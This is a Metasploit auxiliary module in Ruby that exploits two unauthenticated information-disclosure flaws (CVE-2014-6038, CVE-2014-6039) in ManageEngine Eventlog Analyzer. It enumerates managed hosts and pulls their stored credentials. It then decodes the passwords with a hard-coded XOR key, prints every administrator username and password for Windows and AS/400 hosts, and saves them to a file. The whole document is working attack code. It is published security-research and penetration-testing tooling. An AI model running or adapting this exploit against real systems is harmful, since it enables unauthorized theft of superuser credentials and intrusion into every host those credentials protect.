##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'msf/core'
require 'rexml/document'
class Metasploit3 < Msf::Auxiliary
include Msf::Exploit::Remote::HttpClient
include Msf::Auxiliary::Report
def initialize(info = {})
super(update_info(info,
'Name' => 'ManageEngine Eventlog Analyzer Managed Hosts Administrator 
Credential Disclosure',
'Description' => %q{
ManageEngine Eventlog Analyzer from v7 to v9.9 b9002 has two security 
vulnerabilities that allow
an unauthenticated user to obtain the superuser password of any managed 
Windows and AS/400 hosts.
This module abuses both vulnerabilities to collect all the available 
usernames and passwords.
First the agentHandler servlet is abused to get the hostid and slid of 
each device (CVE-2014-6038);
then these numeric id's are used to extract usernames and passwords by 
abusing the hostdetails
servlet (CVE-2014-6039).
Note that on version 7 the TARGETURI has to be prepended with /event.
},
'Author' =>
[
'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and MSF 
module
],
'License' => MSF_LICENSE,
'References' =>
[
[ 'CVE', '2014-6038' ],
[ 'CVE', '2014-6039' ],
[ 'OSVDB', 'TODO' ],
[ 'OSVDB', 'TODO' ],
[ 'URL', 
'https://raw.githubusercontent.com/pedrib/PoC/master/ManageEngine/me_eventlog_info_disc.txt' 
],
[ 'URL', 'TODO_FULLDISC_URL' ]
],
'DisclosureDate' => 'Nov 5 2014'))
register_options(
[
OptPort.new('RPORT',
[true, 'The target port', 8400]),
OptString.new('TARGETURI', [ true, "Eventlog Analyzer application URI 
(should be /event for version 7)", '/']),
], self.class)
end
def decode_password(encoded_password)
password_xor = Rex::Text.decode_base64(encoded_password)
password = ""
password_xor.bytes.each do |byte|
password << (byte ^ 0x30)
end
return password
end
def run
res = send_request_cgi({
'uri' => normalize_uri(target_uri.path, "agentHandler"),
'method' =>'GET',
'vars_get' => {
'mode' => 'getTableData',
'table' => 'HostDetails'
}
})
if res and res.code == 200
# When passwords have digits the XML parsing will fail.
# Replace with an empty password attribute so that we know the device 
has a password
# and therefore we want to add it to our host list.
xml = res.body.to_s.gsub(/&#[0-9]*;/,Rex::Text.rand_text_alpha(6))
begin
doc = REXML::Document.new(xml)
rescue
fail_with(Failure::Unknown, "#{peer} - Error parsing the XML, dumping 
output #{xml}")
end
slid_host_ary = Array.new
doc.elements.each('Details/HostDetails') do |ele|
if ele.attributes["password"] != nil
# If an element doesn't have a password, then we don't care about it.
# Otherwise store the slid and host_id to use later.
slid_host_ary << [ele.attributes["slid"], ele.attributes["host_id"]]
end
end
cred_table = Rex::Ui::Text::Table.new(
'Header' => 'ManageEngine EventLog Analyzer Managed Devices 
Credentials',
'Indent' => 1,
'Columns' =>
[
'Host',
'Type',
'SubType',
'Domain',
'Username',
'Password',
]
)
slid_host_ary.each do |host|
res = send_request_cgi({
'uri' => normalize_uri(target_uri.path, "hostdetails"),
'method' =>'GET',
'vars_get' => {
'slid' => host[0],
'hostid' => host[1]
}
})
if res and res.code == 200
begin
doc = REXML::Document.new(res.body)
rescue
fail_with(Failure::Unknown, "#{peer} - Error parsing the XML, dumping 
output #{res.body.to_s}")
end
doc.elements.each('Details/Hosts') do |ele|
# Add an empty string if a variable doesn't exist, we have to check it
# somewhere and it's easier to do it here.
dns_name = (ele.attributes["dns_name"] != nil ? 
ele.attributes["dns_name"] : "")
host_ipaddress = (ele.attributes["host_ipaddress"] != nil ? 
ele.attributes["host_ipaddress"] : "")
ele.elements.each('HostDetails') do |details|
domain_name = (details.attributes["domain_name"] != nil ? 
details.attributes["domain_name"] : "")
username = (details.attributes["username"] != nil ? 
details.attributes["username"] : "")
password_encoded = (details.attributes["password"] != nil ? 
details.attributes["password"] : "")
password = decode_password(password_encoded)
type = (details.attributes["type"] != nil ? details.attributes["type"] : 
"")
subtype = (details.attributes["subtype"] != nil ? 
details.attributes["subtype"] : "")
if not (type =~ /Windows/ or subtype =~ /Windows/)
# With AS/400 we get some garbage in the domain name even though it 
doesn't exist
domain_name = ""
end
cred_table << [host_ipaddress, type, subtype, domain_name, username, 
password]
msg = "Got login to #{host_ipaddress} | running "
msg << type << (subtype != "" ? " | #{subtype}" : "")
msg << " | username: "
msg << (domain_name != "" ? "#{domain_name}\\#{username}" : username)
msg << " | password: #{password}"
print_good(msg)
end
end
else
print_error("#{peer} - Failed to reach hostdetails servlet")
end
end
print_line
print_line("#{cred_table}")
loot_name = 'manageengine.eventlog.managed_hosts.creds'
loot_type = 'text/csv'
loot_filename = 'manageengine_eventlog_managed_hosts_creds.csv'
loot_desc = 'ManageEngine Eventlog Analyzer Managed Hosts Administrator 
Credentials'
p = store_loot(
loot_name,
loot_type,
rhost,
cred_table.to_csv,
loot_filename,
loot_desc)
print_status "Credentials saved in: #{p}"
else
print_error("#{peer} - Failed to reach agentHandler servlet")
end
end
end


